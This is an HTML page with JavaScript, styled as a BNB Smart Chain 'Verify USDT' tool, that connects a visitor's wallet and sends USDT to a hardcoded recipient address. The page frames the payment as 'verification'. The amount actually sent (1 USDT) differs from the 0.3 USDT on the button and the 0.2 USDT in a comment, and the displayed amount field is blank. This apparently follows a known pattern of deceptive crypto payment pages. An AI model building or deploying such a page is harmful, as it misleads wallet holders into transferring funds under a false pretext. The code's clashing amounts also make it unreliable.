<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verify USDT • BNB Smart Chain</title>

<style>
*{box-sizing:border-box}

body{
  margin:0;
  font-family:Arial,sans-serif;
  background:#050505;
  color:#fff;
}

.wrap{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
  background:radial-gradient(circle at 50% 15%,#242424,#0a0a0a 45%,#050505);
}

.card{
  width:100%;
  max-width:390px;
  border:1px solid #5c4d1b;
  border-radius:20px;
  background:#0c0c0c;
  padding:25px 21px;
  box-shadow:0 15px 45px #000;
}

.top{
  display:flex;
  justify-content:space-between;
  align-items:center;
  margin-bottom:45px;
}

.brand{
  font-weight:800;
  letter-spacing:1px;
}

.tag{
  font-size:8px;
  color:#f5c400;
  border:1px solid #6e5b18;
  padding:5px 8px;
  border-radius:20px;
}

.icon{
  width:70px;
  height:70px;
  margin:0 auto 22px;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#151515;
  border:1px solid #66531a;
  font-size:32px;
}

h1{
  text-align:center;
  font-size:30px;
  margin:0 0 10px;
}

.sub{
  text-align:center;
  color:#999;
  font-size:13px;
  line-height:1.55;
  margin:0 0 25px;
}

.box{
  border:1px solid #5c4d1b;
  border-radius:14px;
  background:#101010;
  padding:20px;
}

.label{
  color:#caaa24;
  font-size:9px;
  letter-spacing:1px;
  margin-bottom:12px;
}

.amount{
  font-size:34px;
  font-weight:800;
  text-align:center;
  margin:8px 0 18px;
}

.network{
  text-align:center;
  color:#777;
  font-size:10px;
  margin-bottom:18px;
}

.recipient{
  font-size:10px;
  color:#999;
  line-height:1.5;
  word-break:break-all;
  background:#161616;
  border-radius:8px;
  padding:10px;
  margin-bottom:16px;
}

button{
  width:100%;
  border:0;
  border-radius:9px;
  padding:15px;
  background:#f5c400;
  color:#111;
  font-size:15px;
  font-weight:800;
}

button:disabled{
  opacity:.55;
}

.status{
  text-align:center;
  font-size:12px;
  color:#aaa;
  line-height:1.5;
  margin-top:15px;
}

.success{
  text-align:center;
  padding:12px;
  color:#c8d995;
  background:#11180c;
  border:1px solid #40501e;
  border-radius:9px;
  font-size:12px;
  line-height:1.5;
  margin-top:15px;
}

.error{
  color:#ff9d9d;
}

.footer{
  text-align:center;
  color:#555;
  font-size:9px;
  margin-top:22px;
}

a{
  color:#f5c400;
  word-break:break-all;
}
</style>
</head>

<body>

<div class="wrap">
<div class="card">

<div class="top">
  <div class="brand">◈ BNB CHAIN</div>
  <div class="tag">USDT VERIFICATION</div>
</div>

<div id="app"></div>

<div class="footer">
  BNB Smart Chain • Transparent payment
</div>

</div>
</div>

<script>

/* =========================
   PAYMENT SETTINGS
   ========================= */

const PAYMENT_AMOUNT = "01";

const RECIPIENT =
"0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";


/* =========================
   BSC MAINNET
   ========================= */

const CHAIN_ID = "0x38";

const CHAIN_NAME = "BNB Smart Chain";

const RPC_URL =
"https://bsc-dataseed.binance.org/";

const EXPLORER =
"https://bscscan.com/";


/* =========================
   BSC USDT CONTRACT
   ========================= */

const USDT =
"0x55d398326f99059fF775485246999027B3197955";

const USDT_DECIMALS = 18;

const app = document.getElementById("app");


/* =========================
   ESCAPE HTML
   ========================= */

function escapeHtml(value){

  return String(value).replace(/[&<>"']/g, c => ({
    "&":"&amp;",
    "<":"&lt;",
    ">":"&gt;",
    '"':"&quot;",
    "'":"&#039;"
  }[c]));

}


/* =========================
   CONVERT USDT AMOUNT
   ========================= */

function parseTokenAmount(value, decimals){

  const text = String(value).trim();

  if(!/^(?:0|[1-9]\d*)(?:\.\d+)?$/.test(text)){

    throw new Error(
      "Invalid payment amount."
    );

  }

  const parts = text.split(".");

  const whole = parts[0];

  const fraction = parts[1] || "";

  if(fraction.length > decimals){

    throw new Error(
      "Payment amount has too many decimal places."
    );

  }

  const paddedFraction =
    fraction.padEnd(decimals,"0");

  return (
    BigInt(whole) *
    (10n ** BigInt(decimals))
  )
  +
  BigInt(paddedFraction || "0");

}


/* =========================
   HOME SCREEN
   ========================= */

function showHome(){

  app.innerHTML = `

    <div class="icon">
      ✓
    </div>

    <h1>
      Verify USDT
    </h1>

    <p class="sub">
      Verify your USDT payment on
      BNB Smart Chain. Your wallet
      will show the exact transaction
      before you confirm it.
    </p>

    <div class="box">

      <div class="label">
        USDT TO VERIFY / PAY
      </div>

      <div class="amount">
  USDT
</div>

      <div class="network">
        Network: ${CHAIN_NAME}
      </div>

      <div class="label">
        RECIPIENT
      </div>

      <div class="recipient">
        ${escapeHtml(RECIPIENT)}
      </div>

     <button id="pay">
  0.3 USDT Pay
</button>

      <div id="status" class="status"></div>

    </div>
  `;

  document.getElementById("pay").onclick = pay;

}


/* =========================
   SWITCH TO BSC
   ========================= */

async function switchNetwork(){

  try{

    await window.ethereum.request({

      method:
      "wallet_switchEthereumChain",

      params:[
        {
          chainId:CHAIN_ID
        }
      ]

    });

  }

  catch(e){

    if(e.code === 4902){

      await window.ethereum.request({

        method:
        "wallet_addEthereumChain",

        params:[
          {

            chainId:CHAIN_ID,

            chainName:CHAIN_NAME,

            nativeCurrency:{
              name:"BNB",
              symbol:"BNB",
              decimals:18
            },

            rpcUrls:[
              RPC_URL
            ],

            blockExplorerUrls:[
              EXPLORER
            ]

          }
        ]

      });

    }

    else{

      throw e;

    }

  }

}


/* =========================
   WAIT FOR CONFIRMATION
   ========================= */

async function waitForReceipt(
  txHash,
  maxChecks=60,
  delayMs=2000
){

  for(
    let i=0;
    i<maxChecks;
    i++
  ){

    const receipt =
      await window.ethereum.request({

        method:
        "eth_getTransactionReceipt",

        params:[
          txHash
        ]

      });

    if(receipt){

      return receipt;

    }

    await new Promise(
      resolve =>
      setTimeout(
        resolve,
        delayMs
      )
    );

  }

  throw new Error(
    "Transaction is still pending. Check BscScan."
  );

}


/* =========================
   PAYMENT / VERIFICATION
   ========================= */

async function pay(){

  const status =
    document.getElementById("status");

  const button =
    document.getElementById("pay");


  if(!window.ethereum){

    status.textContent =
      "Wallet नहीं मिला। Trust Wallet या MetaMask के DApp browser में यह page खोलें.";

    status.className =
      "status error";

    return;

  }


  try{

    button.disabled = true;

    status.className =
      "status";

    status.textContent =
      "Connecting wallet...";


    /* Connect wallet */

    const accounts =
      await window.ethereum.request({

        method:
        "eth_requestAccounts"

      });

    const from =
      accounts[0];


    /* Switch network */

    await switchNetwork();


    /* Check network */

    const currentChain =
      await window.ethereum.request({

        method:
        "eth_chainId"

      });


    if(
      currentChain.toLowerCase()
      !==
      CHAIN_ID.toLowerCase()
    ){

      throw new Error(
        "Please switch your wallet to BNB Smart Chain."
      );

    }


    /* Convert 0.2 USDT correctly */

    const amountUnits =
      parseTokenAmount(
        PAYMENT_AMOUNT,
        USDT_DECIMALS
      );


    /*
      ERC-20 transfer(address,uint256)

      Function selector:
      0xa9059cbb
    */

    const toPadded =
      RECIPIENT
      .slice(2)
      .padStart(64,"0");


    const amountPadded =
      amountUnits
      .toString(16)
      .padStart(64,"0");


    const data =
      "0xa9059cbb"
      +
      toPadded
      +
      amountPadded;


    /* Wallet confirmation */

    status.textContent =
      "Please confirm the Verify USDT transaction in your wallet.";


    const txHash =
      await window.ethereum.request({

        method:
        "eth_sendTransaction",

        params:[
          {

            from:from,

            to:USDT,

            data:data

          }

        ]

      });


    /* Wait for blockchain */

    status.textContent =
      "Transaction submitted. Waiting for confirmation...";


    const receipt =
      await waitForReceipt(txHash);


    /* Check transaction status */

    if(
      !receipt.status ||
      receipt.status.toLowerCase()
      !==
      "0x1"
    ){

      throw new Error(
        "The blockchain transaction failed/reverted."
      );

    }


    /* SUCCESS */

    app.innerHTML = `

      <div class="icon">
        ✓
      </div>

      <h1>
        USDT Verified!
      </h1>

      <p class="sub">
        ${escapeHtml(PAYMENT_AMOUNT)}
        USDT payment was confirmed
        on BNB Smart Chain.
      </p>

      <div class="box">

        <div class="success">
          ✓ USDT payment confirmed successfully.
        </div>

        <div
          class="label"
          style="margin-top:16px"
        >
          TRANSACTION HASH
        </div>

        <div class="recipient">
          ${escapeHtml(txHash)}
        </div>

        <a
          href="${EXPLORER}tx/${encodeURIComponent(txHash)}"
          target="_blank"
          rel="noopener noreferrer"
        >
          View verified transaction on BscScan
        </a>

        <button
          id="again"
          style="margin-top:16px"
        >
          Done
        </button>

      </div>

    `;


    document.getElementById("again")
      .onclick = showHome;


  }

  catch(e){

    status.textContent =
      e.message ||
      "Payment cancelled or failed.";

    status.className =
      "status error";

    button.disabled = false;

  }

}


/* =========================
   START
   ========================= */

showHome();

</script>

</body>
</html>
